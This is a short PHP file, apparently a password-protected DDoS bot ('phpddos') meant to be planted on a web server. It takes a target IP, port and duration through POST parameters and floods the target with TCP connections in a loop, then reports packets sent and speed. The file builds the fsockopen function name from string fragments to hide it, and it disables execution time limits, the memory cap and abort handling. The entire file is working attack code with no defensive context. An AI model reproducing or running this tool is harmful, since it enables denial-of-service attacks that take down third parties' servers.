<?php
$password='phpddos54df';
//ip=qq.com&port=80&time=3&password=phpddos54df
//Code by juzeon
set_time_limit(0);
ini_set('memory_limit', '-1');
date_default_timezone_set('Asia/Shanghai');
ignore_user_abort(true);
ob_implicit_flush(true);
$evil_function='f'.'s'.'0'.'c';
$evil_function.='k'.'0'.'p'.'e'.'n';
$evil_function=str_replace('0','o',$evil_function);
if(!function_exists($evil_function)){
	exit(json_encode(array('status'=>'error','msg'=>'Function not found')));
}
$packets = 0;
if(!isset($_POST['ip'])){
	exit(json_encode(array('status'=>'error','msg'=>'IP not found')));
}
if(!isset($_POST['port'])){
	exit(json_encode(array('status'=>'error','msg'=>'Port not found')));
}
if(!isset($_POST['time'])){
	exit(json_encode(array('status'=>'error','msg'=>'Time not found')));
}
if(!isset($_POST['password'])){
	exit(json_encode(array('status'=>'error','msg'=>'Incorrect password')));
}else{
	if($password!=$_POST['password']){
		exit(json_encode(array('status'=>'error','msg'=>'Incorrect password')));
	}
}
$ip = $_POST['ip'];
$port = $_POST['port'];
$exec_time = $_POST['time'];
$time = time();
$max_time = $time+$exec_time;
while(true){
$packets++;
        if(time() >= $max_time){
                break;
        }
        $fp = $evil_function('tcp://'.$ip, $port,$errno,$errstr,2);
}
exit(json_encode(array('status'=>'success','msg'=>array('packets'=>$packets,'speed'=>round(($packets*65*8)/(1024*1024),2)))));
function endPacket(){
    echo "0\r\n\r\n";
    ob_flush();
    flush();
}